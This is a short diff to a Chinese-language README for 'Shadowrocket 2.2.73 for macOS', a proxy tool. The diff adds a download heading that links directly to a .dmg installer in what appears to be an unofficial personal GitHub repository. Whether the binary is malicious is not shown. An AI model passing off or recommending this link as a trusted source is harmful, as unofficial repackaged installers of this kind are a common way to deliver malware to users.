@@ -1,5 +1,9 @@
 # Shadowrocket 2.2.73 for macOS
 
+下载地址
+## https://github.com/YorkRaleign6/Shadowrocket/releases/download/2.2.73/Shadowrock2.2.73.dmg
+
+
 ## 简介
 
 Shadowrocket 是一款功能强大的网络代理工具，支持多种代理协议，为用户提供安全、稳定的网络访问体验。本版本为 macOS 平台优化版本。
@@ -210,3 +214,4 @@ Shadowrocket 支持以下主流代理协议：
 **祝您使用愉快！**
 
 如有问题或建议，欢迎反馈。
+
